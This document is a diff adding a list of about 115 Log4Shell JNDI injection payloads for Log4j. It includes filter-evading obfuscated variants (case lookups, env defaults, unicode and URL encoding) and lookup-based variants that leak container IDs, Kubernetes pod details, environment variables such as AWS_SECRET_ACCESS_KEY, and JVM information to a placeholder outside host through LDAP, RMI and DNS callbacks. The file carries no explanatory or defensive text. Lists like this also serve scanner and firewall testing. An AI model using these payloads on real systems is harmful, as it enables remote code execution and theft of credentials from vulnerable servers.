@@ -1,0 +1,115 @@
+${jndi:ldap://domain.com/j}
+${jndi:ldap:/domain.com/a}
+${jndi:dns:/domain.com}
+${jndi:dns://domain.com/j}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
+${${::-j}ndi:rmi://domain.com/j}
+${jndi:rmi://domainldap.com/j}
+${${lower:jndi}:${lower:rmi}://domain.com/j}
+${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
+${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://domain.com/j}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}
+${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
+${jn${env::-}di:ldap://domain.com/j}
+${jn${date:}di${date:':'}ldap://domain.com/j}
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://domain.com/j}
+${j${main:\k5:-Nd}i${spring:k5:-:}ldap://domain.com/j}
+${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://domain.com/j}
+${j${::-nD}i${::-:}ldap://domain.com/j}
+${j${EnV:K5:-nD}i:ldap://domain.com/j}
+${j${loWer:Nd}i${uPper::}ldap://domain.com/j}
+${jndi:ldap://127.0.0.1#domain.com/j}
+${jnd${upper:ı}:ldap://domain.com/j}
+${jnd${sys:SYS_NAME:-i}:ldap:/domain.com/j}
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://domain.com/j}
+${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://domain.com/j}
+${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://domain.com/j}
+${\u006a\u006e\u0064\u0069:ldap://domain.com/j}
+${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.domain.com/j}
+${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://domain.com/j}
+%24%7Bjndi:ldap://domain.com/j%7D
+%24%7Bjn$%7Benv::-%7Ddi:ldap://domain.com/j%7D
+
+# Docker Lookup
+${jndi:ldap://${docker:containerId}.domain.com/j}
+${jndi:ldap://${docker:containerName}.domain.com/j}
+${jndi:ldap://${docker:imageId}.domain.com/j}
+${jndi:ldap://${docker:imageName}.domain.com/j}
+${jndi:ldap://${docker:shortContainerId}.domain.com/j}
+${jndi:ldap://${docker:shortImageId}.domain.com/j}
+
+# Environment Lookup
+${jndi:ldap://${env:USER}.domain.com/j}
+${jndi:ldap://${env:user}.domain.com/j}
+${jndi:ldap://${env:COMPUTERNAME}.domain.com/j}
+${jndi:ldap://${env:USERDOMAIN}.domain.com/j}
+${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.domain.com/j}
+${jndi:ldap://${hostName}.domain.com/j}
+${jndi:ldap://${env:JAVA_VERSION}.domain.com/j}
+
+# Java Lookup
+${jndi:ldap://${java:version}.domain.com/j}
+${jndi:ldap://${java:runtime}.domain.com/j}
+${jndi:ldap://${java:vm}.domain.com/j}
+${jndi:ldap://${java:os}.domain.com/j}
+${jndi:ldap://${java:locale}.domain.com/j}
+${jndi:ldap://${java:hw}.domain.com/j}
+
+# Kubernetes Lookup
+${jndi:ldap://${k8s:accountName}.domain.com/j}
+${jndi:ldap://${k8s:clusterName}.domain.com/j}
+${jndi:ldap://${k8s:containerId}.domain.com/j}
+${jndi:ldap://${k8s:containerName}.domain.com/j}
+${jndi:ldap://${k8s:host}.domain.com/j}
+${jndi:ldap://${k8s:hostIp}.domain.com/j}
+${jndi:ldap://${k8s:labels.app}.domain.com/j}
+${jndi:ldap://${k8s:labels.podTemplateHash}.domain.com/j}
+${jndi:ldap://${k8s:masterUrl}.domain.com/j}
+${jndi:ldap://${k8s:namespaceId}.domain.com/j}
+${jndi:ldap://${k8s:namespaceName}.domain.com/j}
+${jndi:ldap://${k8s:podId}.domain.com/j}
+${jndi:ldap://${k8s:podIp}.domain.com/j}
+${jndi:ldap://${k8s:podName}.domain.com/j}
+${jndi:ldap://${k8s:imageId}.domain.com/j}
+${jndi:ldap://${k8s:imageName}.domain.com/j}
+${jndi:ldap://.domain.com/j}
+
+# Main Arguments Lookup
+${jndi:ldap://${main:0}.domain.com/j}
+${jndi:ldap://${main:1}.domain.com/j}
+${jndi:ldap://${main:2}.domain.com/j}
+${jndi:ldap://${main:3}.domain.com/j}
+${jndi:ldap://${main:4}.domain.com/j}
+${jndi:ldap://${main:\--file}.domain.com/j}
+${jndi:ldap://${main:\-x}.domain.com/j}
+${jndi:ldap://${main:bar}.domain.com/j}
+${jndi:ldap://${main:\--quiet:-true}.domain.com/j}
+
+# Web Lookup
+${jndi:ldap://${web:attr.name}.domain.com/j}
+${jndi:ldap://${web:contextPath}.domain.com/j}
+${jndi:ldap://${web:contextPathName}.domain.com/j}
+${jndi:ldap://${web:effectiveMajorVersion}.domain.com/j}
+${jndi:ldap://${web:effectiveMinorVersion}.domain.com/j}
+${jndi:ldap://${web:initParam.name}.domain.com/j}
+${jndi:ldap://${web:majorVersion}.domain.com/j}
+${jndi:ldap://${web:minorVersion}.domain.com/j}
+${jndi:ldap://${web:rootDir}.domain.com/j}
+${jndi:ldap://${web:serverInfo}.domain.com/j}
+${jndi:ldap://${web:servletContextName}.domain.com/j}
+
+# System Properties Lookup
+${jndi:ldap://${sys:logPath}.domain.com/j}
+${jndi:ldap://${sys:java.version}.domain.com/j}
+${jndi:ldap://${sys:java.vendor}.domain.com/j}
+
+# Structured Data Lookup
+${jndi:ldap://${sys:logPath}.domain.com/j}
+
+# Date Lookup
+${jndi:ldap://${date:MM-dd-yyyy}.domain.com/j}
+
+# Context Map Lookup
+${jndi:ldap://${ctx:loginId}.domain.com/j}
